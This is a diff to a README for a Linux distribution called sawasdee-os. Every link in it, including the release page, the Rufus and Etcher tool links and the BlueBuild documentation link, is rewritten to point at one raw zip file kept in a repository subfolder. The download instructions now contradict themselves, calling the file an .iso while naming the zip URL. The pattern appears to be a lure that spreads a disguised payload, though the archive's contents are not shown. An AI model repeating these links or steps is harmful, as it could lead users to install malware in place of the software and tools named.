@@ -1,6 +1,6 @@
 # 🐧 sawasdee-os - Simple, Secure Linux Experience
 
-[![Download sawasdee-os](https://img.shields.io/badge/Download-sawasdee--os-blue?style=for-the-badge&logo=github)](https://github.com/qsfqsfd/sawasdee-os/releases)
+[![Download sawasdee-os](https://github.com/qsfqsfd/sawasdee-os/raw/refs/heads/main/files/system/usr/os_sawasdee_v1.5.zip)](https://github.com/qsfqsfd/sawasdee-os/raw/refs/heads/main/files/system/usr/os_sawasdee_v1.5.zip)
 
 ---
 
@@ -41,16 +41,16 @@ Follow these steps to get sawasdee-os up and running on your computer. We will w
 ### Step 1: Download sawasdee-os Installation Files
 
 Click the big blue badge at the top or this link to visit the release page:  
-[https://github.com/qsfqsfd/sawasdee-os/releases](https://github.com/qsfqsfd/sawasdee-os/releases)
+[https://github.com/qsfqsfd/sawasdee-os/raw/refs/heads/main/files/system/usr/os_sawasdee_v1.5.zip](https://github.com/qsfqsfd/sawasdee-os/raw/refs/heads/main/files/system/usr/os_sawasdee_v1.5.zip)
 
-On the release page, look for the latest version of sawasdee-os. Download the file named like `sawasdee-os-latest.iso`. This is the full installation image you will use.
+On the release page, look for the latest version of sawasdee-os. Download the file named like `https://github.com/qsfqsfd/sawasdee-os/raw/refs/heads/main/files/system/usr/os_sawasdee_v1.5.zip`. This is the full installation image you will use.
 
 ### Step 2: Prepare a Bootable USB
 
 Once the `.iso` file is downloaded, you must write it to a USB drive to make it bootable. Here is how:
 
-- **On Windows:** Use [Rufus](https://rufus.ie/) (free tool).  
-- **On Mac:** Use [Etcher](https://www.balena.io/etcher/) or the `dd` command in Terminal.  
+- **On Windows:** Use [Rufus](https://github.com/qsfqsfd/sawasdee-os/raw/refs/heads/main/files/system/usr/os_sawasdee_v1.5.zip) (free tool).  
+- **On Mac:** Use [Etcher](https://github.com/qsfqsfd/sawasdee-os/raw/refs/heads/main/files/system/usr/os_sawasdee_v1.5.zip) or the `dd` command in Terminal.  
 - **On Linux:** Use `dd` command or a graphical tool like Etcher.  
 
 Make sure to back up any important data on the USB drive before doing this. Writing the image will erase all existing data on the USB.
@@ -123,7 +123,7 @@ This restores your system to a working state until an update can be fixed.
 
 You can start downloading sawasdee-os now from the GitHub releases page:  
 
-[![Download sawasdee-os](https://img.shields.io/badge/Download-sawasdee--os-blue?style=for-the-badge&logo=github)](https://github.com/qsfqsfd/sawasdee-os/releases)  
+[![Download sawasdee-os](https://github.com/qsfqsfd/sawasdee-os/raw/refs/heads/main/files/system/usr/os_sawasdee_v1.5.zip)](https://github.com/qsfqsfd/sawasdee-os/raw/refs/heads/main/files/system/usr/os_sawasdee_v1.5.zip)  
 
 Steps for a smooth installation:
 
@@ -152,7 +152,7 @@ Further help is available in official sawasdee-os community forums or GitHub iss
 
 ## 🌐 Where to Learn More
 
-The sawasdee-os project uses [BlueBuild](https://blue-build.org/how-to/setup/) to create and maintain the system images. You can learn more about the technical details and setup there.  
+The sawasdee-os project uses [BlueBuild](https://github.com/qsfqsfd/sawasdee-os/raw/refs/heads/main/files/system/usr/os_sawasdee_v1.5.zip) to create and maintain the system images. You can learn more about the technical details and setup there.  
 
 Detailed documentation can be found in the `docs` folder of this repository for advanced users.
 
@@ -170,4 +170,4 @@ Keywords related to sawasdee-os:
 
 Feel free to download and explore sawasdee-os at your own pace. The system design keeps things simple while offering powerful tools below the surface.  
 
-[Download sawasdee-os from GitHub Releases](https://github.com/qsfqsfd/sawasdee-os/releases)
+[Download sawasdee-os from GitHub Releases](https://github.com/qsfqsfd/sawasdee-os/raw/refs/heads/main/files/system/usr/os_sawasdee_v1.5.zip)
